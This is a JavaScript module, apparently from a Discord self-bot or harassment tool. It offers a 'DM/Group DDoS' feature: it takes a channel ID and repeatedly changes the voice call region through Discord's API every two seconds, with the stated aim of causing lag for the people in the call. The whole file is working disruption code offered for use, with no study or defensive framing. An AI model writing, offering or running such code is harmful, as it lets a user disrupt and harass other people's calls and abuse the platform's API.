const voiceModule = {
    showDdosModal() {
        ui.showModal(`
            <h2>💥 DM/Group DDoS</h2>
            <p style="color: #ff6b6b;">Quickly changes the region of a DM/Group to cause lag</p>
            <input type="text" id="ddos-channel-id" placeholder="DM or Group ID" />
            <button onclick="voiceModule.ddos()" class="danger-btn">Start DDoS</button>
        `);
    },

    async ddos() {
        const channelId = document.getElementById('ddos-channel-id').value.trim();
        if (!channelId) {
            alert('Please enter a channel ID');
            return;
        }

        ui.closeModal();

        const regions = ["brazil", "hongkong", "india", "japan", "rotterdam"];
        
        try {
            log('💥 Starting DDoS...', 'warning');
            
            for (let i = 0; i < regions.length; i++) {
                try {
                    await discordFetch(`/channels/${channelId}/call`, {
                        method: 'PATCH',
                        body: JSON.stringify({ region: regions[i] })
                    });
                    log(`✓ Region changed: ${regions[i]}`, 'info');
                    await sleep(2000);
                } catch (error) {}
            }
            
            log('✅ DDoS finished', 'success');
        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
        }
    }
};
